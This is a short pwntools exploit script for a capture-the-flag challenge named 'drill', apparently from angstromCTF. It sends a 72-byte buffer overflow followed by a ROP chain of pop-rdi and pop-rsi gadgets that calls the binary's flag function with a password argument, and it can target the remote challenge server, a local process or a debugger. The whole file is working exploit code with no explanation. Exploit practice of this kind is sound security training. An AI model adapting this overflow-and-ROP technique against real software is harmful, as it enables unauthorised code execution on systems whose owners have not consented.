from pwn import *
elf_file = FILENAME = './drill'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log


#drill
HOST = 'challs.actf.co'
POST = 31225
'''
HOST = 'localhost'
POST = 7777
libc = ELF("./libc.so.6")
'''
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    libc = ELF('./libc.so.6')
    c = remote(HOST, POST)
elif len(sys.argv) > 1 and sys.argv[1] == 'd':
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    cmd = """
    b main
    c
    """
    c = gdb.debug(FILENAME,cmd)
else:
    c = process(elf_file,env={'LD_LIBRARY_PATH':'./libc.so.6','all_proxy':'','ALL_PROXY':''})

password = 0x1337
buf = 72
prdi = 0x4013f3
p_rsi_r15 = 0x004013f1
ret = 0x004011a4
payload  = 'A'*buf
payload += p64(prdi)
payload += p64(password)
payload += p64(p_rsi_r15)
payload += p64(elf.sym.name)
payload += 'AAAAAAAA'
payload += p64(elf.sym['flag'])

c.sendline('bobby')
c.sendline(payload)
c.interactive()